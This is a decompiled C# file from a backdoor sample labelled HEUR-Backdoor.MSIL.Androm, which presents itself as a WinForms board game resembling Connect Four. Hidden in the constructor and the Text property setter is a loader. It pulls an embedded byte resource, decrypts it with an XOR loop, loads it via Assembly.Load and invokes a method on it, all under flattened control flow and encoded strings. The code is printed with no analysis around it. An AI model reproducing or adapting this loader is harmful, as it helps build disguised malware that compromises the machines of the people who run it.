// Decompiled with JetBrains decompiler
// Type: TGL.Shared.StrategyComparator
// Assembly: InvalidOleVariantTypeExcept, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9E82E8E9-C8CD-41F7-BA61-2A9379AE4148
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Androm.gen-02b77b24d467552510c0f56dbde53c82e4e932dcaeb0e08fcfec00d4c359a9b9.exe

using InvalidOleVariantTypeExcept.Connections;
using InvalidOleVariantTypeExcept.Filters;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using TGL.Configurations;
using TGL.Licensing;
using TGL.Services;

namespace TGL.Shared
{
  public class StrategyComparator : GetterStrategyConnector
  {
    private ConsumerVisitorConfig annotationComparator;
    private IContainer m_AuthenticationComparator;
    private static object exporterComparator;
    private Panel m_DispatcherComparator;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public StrategyComparator()
    {
      int num1 = 11;
      while (true)
      {
        int num2 = num1;
        string[] parameters;
        MethodInfo method;
        while (true)
        {
          switch (num2)
          {
            case 0:
              parameters[2] = RoleValueFilter.RestartVisitor(5898);
              if (StrategyComparator.InstantiateInfo())
              {
                num2 = 3;
                continue;
              }
              goto case 5;
            case 1:
              goto label_1;
            case 2:
              this.m_AuthenticationComparator = (IContainer) null;
              num2 = 9;
              continue;
            case 3:
            case 8:
              method.Invoke((object) 0, (object[]) parameters);
              num2 = 5;
              continue;
            case 4:
              goto label_13;
            case 5:
              this.annotationComparator = new ConsumerVisitorConfig();
              if (true)
              {
                num2 = 12;
                continue;
              }
              goto label_7;
            case 6:
            case 7:
              goto label_9;
            case 9:
              goto label_7;
            case 10:
              method = ((System.Type) StrategyComparator.exporterComparator).GetMethod(RoleValueFilter.RestartVisitor(5736));
              parameters = new string[3];
              num2 = 1;
              continue;
            case 11:
              UtilsContextLicense.ListWorker();
              num2 = 2;
              continue;
            case 12:
              goto label_15;
            default:
              if (!StrategyComparator.CreateInfo())
              {
                num2 = 7;
                continue;
              }
              goto case 0;
          }
        }
label_1:
        parameters[0] = RoleValueFilter.RestartVisitor(5762);
        goto label_9;
label_7:
        // ISSUE: explicit constructor call
        base.\u002Ector();
        num1 = 4;
        continue;
label_9:
        parameters[1] = RoleValueFilter.RestartVisitor(5858);
        num1 = 0;
        continue;
label_13:
        this.DefineVisitor();
        num1 = 10;
      }
label_15:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void reset()
    {
      int num = 0;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 0:
            flag = this.annotationComparator != null;
            num = 3;
            continue;
          case 1:
          case 3:
            if (!flag)
              goto label_2;
            else
              goto case 2;
          case 2:
          case 4:
            this.annotationComparator.reset();
            num = 5;
            continue;
          case 5:
            goto label_7;
          default:
            num = 4;
            continue;
        }
      }
label_2:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void setLastMove(object res, int counter_size) => this.annotationComparator.setLastMove(res, counter_size);

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override SqlParameterType updateMove() => this.annotationComparator.updateMove();

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void draw()
    {
      base.draw();
      this.m_DispatcherComparator.Refresh();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PrepareVisitor(object config, PaintEventArgs col)
    {
      int num1 = 21;
      if (false)
        goto label_37;
label_24:
      int num2;
      bool flag1;
      while (true)
      {
        int num3;
        int num4;
        BufferedGraphics bufferedGraphics;
        SolidBrush solidBrush;
        int num5;
        int num6;
        int num7;
        int num8;
        int num9;
        int num10;
        int width1;
        int height1;
        int height2;
        bool flag2;
        long num11;
        int width2;
        bool flag3;
        Rectangle rectangle;
        switch (num1)
        {
          case 0:
            bufferedGraphics.Graphics.FillRectangle((Brush) solidBrush, rectangle);
            if (!StrategyComparator.CreateInfo())
            {
              num1 = 17;
              continue;
            }
            goto case 9;
          case 1:
          case 5:
            num10 = 10;
            width2 = this.m_DispatcherComparator.Width;
            height2 = this.m_DispatcherComparator.Height;
            num6 = width2 / 7;
            if (StrategyComparator.InstantiateInfo())
            {
              num1 = 28;
              continue;
            }
            goto case 13;
          case 2:
            height1 = height2 / 6 - num10;
            int num12 = 9;
            num1 = StrategyComparator.CreateInfo() ? num12 : num12;
            continue;
          case 3:
          case 20:
            if (num3 < 49)
            {
              num11 = 1L << num3;
              num4 = 18;
              break;
            }
            num1 = 10;
            continue;
          case 4:
            if (flag1)
            {
              num3 = num2;
              num4 = 13;
              break;
            }
            num4 = 12;
            break;
          case 6:
          case 26:
            goto label_37;
          case 7:
            rectangle = new Rectangle(0, 0, this.m_DispatcherComparator.Width, this.m_DispatcherComparator.Height);
            bufferedGraphics = BufferedGraphicsManager.Current.Allocate(col.Graphics, rectangle);
            num4 = 22;
            break;
          case 8:
            num3 += 7;
            ++num5;
            int num13 = 3;
            num1 = StrategyComparator.CreateInfo() ? num13 : num13;
            continue;
          case 9:
            solidBrush = new SolidBrush(Color.Blue);
            num4 = 7;
            break;
          case 10:
            --num2;
            num4 = 11;
            break;
          case 11:
            ++num8;
            int num14 = 6;
            num1 = StrategyComparator.CreateInfo() ? num14 : num14;
            continue;
          case 12:
            bufferedGraphics.Render();
            if (!StrategyComparator.CreateInfo())
            {
              num1 = 23;
              continue;
            }
            goto case 2;
          case 13:
            num5 = 0;
            goto case 3;
          case 14:
          case 25:
            bufferedGraphics.Graphics.FillEllipse((Brush) solidBrush, num5 * num6 + num7 / 2, num8 * num9 + num10 / 2, width1, height1);
            num4 = 8;
            break;
          case 15:
            if (!flag3)
            {
              flag2 = (this.annotationComparator.VisitComparator()[1] & num11) != 0L;
              num1 = 16;
              continue;
            }
            solidBrush.Color = Color.Red;
            num4 = 14;
            break;
          case 16:
            if (!flag2)
            {
              solidBrush.Color = Color.White;
              goto case 14;
            }
            else
            {
              num1 = 27;
              continue;
            }
          case 17:
            num2 = 5;
            int num15 = 19;
            num1 = StrategyComparator.CreateInfo() ? num15 : num15;
            continue;
          case 18:
            flag3 = (this.annotationComparator.VisitComparator()[0] & num11) != 0L;
            goto case 15;
          case 19:
            num8 = 0;
            num4 = 26;
            break;
          case 21:
            num7 = 10;
            if (StrategyComparator.InstantiateInfo())
            {
              num1 = 5;
              continue;
            }
            goto case 24;
          case 22:
            bufferedGraphics.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
            num1 = 0;
            continue;
          case 23:
            bufferedGraphics.Dispose();
            num4 = 29;
            break;
          case 24:
            width1 = width2 / 7 - num7;
            num4 = 2;
            break;
          case 27:
            solidBrush.Color = Color.Yellow;
            num4 = 25;
            break;
          case 28:
            num9 = height2 / 6;
            if (true)
            {
              num1 = 24;
              continue;
            }
            goto case 16;
          case 29:
            goto label_36;
          default:
            if (true)
            {
              num1 = 15;
              continue;
            }
            goto case 17;
        }
        num1 = num4;
      }
label_36:
      return;
label_37:
      flag1 = num2 >= 0;
      num1 = 4;
      goto label_24;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ResetVisitor(object instance, MouseEventArgs ivk)
    {
      int num1 = 1;
      while (true)
      {
        int num2 = num1;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_1;
            case 2:
              flag = this.annotationComparator.OrderComparator();
              num2 = 4;
              continue;
            case 3:
            case 5:
              goto label_8;
            case 4:
              goto label_3;
            case 6:
              goto label_9;
            default:
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto label_8;
          }
        }
label_1:
        int spec = (int) Math.Floor((double) ivk.X / ((double) this.m_DispatcherComparator.Width / 7.0));
        num1 = 2;
        continue;
label_3:
        if (!flag)
          break;
label_8:
        this.SortComparator((object) spec, 0);
        num1 = 6;
      }
      return;
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool testres)
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          int num3;
          switch (num2)
          {
            case 0:
            case 5:
              if (testres)
              {
                num2 = 2;
                continue;
              }
              num3 = 0;
              goto label_11;
            case 1:
            case 2:
label_9:
              num3 = this.m_AuthenticationComparator != null ? 1 : 0;
              goto label_11;
            case 3:
              break;
            case 4:
              this.m_AuthenticationComparator.Dispose();
              goto case 3;
            case 6:
              goto label_14;
            default:
              if (StrategyComparator.InstantiateInfo())
              {
                num2 = 3;
                continue;
              }
              goto case 3;
          }
label_8:
          base.Dispose(testres);
          if (true)
          {
            num2 = 6;
            continue;
          }
          goto label_9;
label_11:
          if (num3 == 0)
            goto label_8;
          else
            break;
        }
        num1 = 4;
      }
label_14:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void DefineVisitor()
    {
      int num1 = 17;
      while (true)
      {
        int num2 = num1;
        ComponentResourceManager componentResourceManager;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_9;
            case 1:
              this.m_DispatcherComparator.Size = new Size(391, 313);
              this.m_DispatcherComparator.TabIndex = 0;
              if (true)
              {
                num2 = 10;
                continue;
              }
              goto label_13;
            case 2:
              this.PerformLayout();
              if (true)
              {
                num2 = 18;
                continue;
              }
              goto case 9;
            case 3:
              goto label_16;
            case 4:
            case 12:
              goto label_13;
            case 5:
              goto label_2;
            case 6:
            case 10:
              this.m_DispatcherComparator.Paint += new PaintEventHandler(this.PrepareVisitor);
              num2 = 8;
              continue;
            case 7:
              goto label_4;
            case 8:
              this.m_DispatcherComparator.MouseClick += new MouseEventHandler(this.ResetVisitor);
              this.AutoScaleDimensions = new SizeF(6f, 13f);
              num2 = 7;
              continue;
            case 9:
              this.m_Predicate.SuspendLayout();
              num2 = 11;
              continue;
            case 11:
              this.SuspendLayout();
              num2 = 12;
              continue;
            case 13:
              goto label_8;
            case 14:
              goto label_3;
            case 15:
              goto label_14;
            case 16:
              goto label_15;
            case 17:
              componentResourceManager = new ComponentResourceManager(typeof (StrategyComparator));
              if (true)
              {
                num2 = 16;
                continue;
              }
              goto case 8;
            case 18:
              goto label_20;
            default:
              goto label_7;
          }
        }
label_2:
        this.Text = RoleValueFilter.RestartVisitor(5986);
        num1 = 3;
        continue;
label_3:
        this.ClientSize = new Size(712, 557);
        num1 = 15;
        continue;
label_4:
        this.AutoScaleMode = AutoScaleMode.Font;
        goto label_3;
label_7:
        num1 = 14;
        continue;
label_8:
        this.ResumeLayout(false);
        num1 = 2;
        continue;
label_9:
        this.Name = RoleValueFilter.RestartVisitor(5958);
        num1 = 5;
        continue;
label_13:
        this.m_Predicate.Controls.Add((Control) this.m_DispatcherComparator);
        this.m_DispatcherComparator.Location = new Point(6, 12);
        this.m_DispatcherComparator.Name = RoleValueFilter.RestartVisitor(5912);
        num1 = 1;
        continue;
label_14:
        this.Icon = (Icon) componentResourceManager.GetObject(RoleValueFilter.RestartVisitor(5934));
        num1 = 0;
        continue;
label_15:
        this.m_DispatcherComparator = new Panel();
        num1 = 9;
        continue;
label_16:
        this.m_Predicate.ResumeLayout(false);
        num1 = 13;
      }
label_20:;
    }

    public override string Text
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => base.Text;
      [MethodImpl(MethodImplOptions.NoInlining)] set => StrategyComparator.CustomizeVisitor();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static string CustomizeVisitor()
    {
      int num1 = 8;
      string str1;
      while (true)
      {
        int num2 = num1;
        ResourceManager resourceManager;
        string str2;
        byte[] task;
        Assembly ident;
        int num3;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 8:
              goto label_1;
            case 1:
              task = (byte[]) resourceManager.GetObject(RoleValueFilter.RestartVisitor(6006));
              if (StrategyComparator.InstantiateInfo())
              {
                num2 = 11;
                continue;
              }
              goto label_8;
            case 2:
            case 4:
              num3 += -1;
              num2 = 6;
              continue;
            case 3:
              goto label_2;
            case 5:
              ident = StrategyComparator.InsertVisitor(task);
              if (true)
              {
                num2 = 7;
                continue;
              }
              goto case 6;
            case 6:
            case 9:
              flag = num3 >= 0;
              goto case 10;
            case 7:
              goto label_8;
            case 10:
              if (flag)
              {
                task[num3 % 70656] = (byte) ((Convert.ToInt32((int) task[num3 % 70656] ^ (int) str2[num3 % 22]) - Convert.ToInt32(task[(num3 + 1) % 70656]) + 256) % 256);
                if (StrategyComparator.InstantiateInfo())
                {
                  num2 = 2;
                  continue;
                }
                goto label_6;
              }
              else
              {
                if (StrategyComparator.InstantiateInfo())
                {
                  num2 = 5;
                  continue;
                }
                goto case 6;
              }
            case 11:
              goto label_6;
            case 12:
              goto label_16;
            default:
              goto label_14;
          }
        }
label_1:
        resourceManager = new ResourceManager(typeof (GetterStrategyConnector));
        num1 = 1;
        continue;
label_2:
        str1 = str2;
        num1 = 12;
        continue;
label_6:
        str2 = RoleValueFilter.RestartVisitor(6038);
        num3 = 141334;
        num1 = 9;
        continue;
label_8:
        StrategyComparator.FindVisitor(ident);
        num1 = 3;
        continue;
label_14:
        num1 = 10;
      }
label_16:
      return str1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static Assembly InsertVisitor(byte[] task) => Assembly.Load(task);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void FindVisitor(Assembly ident) => StrategyComparator.exporterComparator = (object) ident.GetType(RoleValueFilter.RestartVisitor(6086));

    internal static bool InstantiateInfo() => true;

    internal static bool CreateInfo() => false;
  }
}
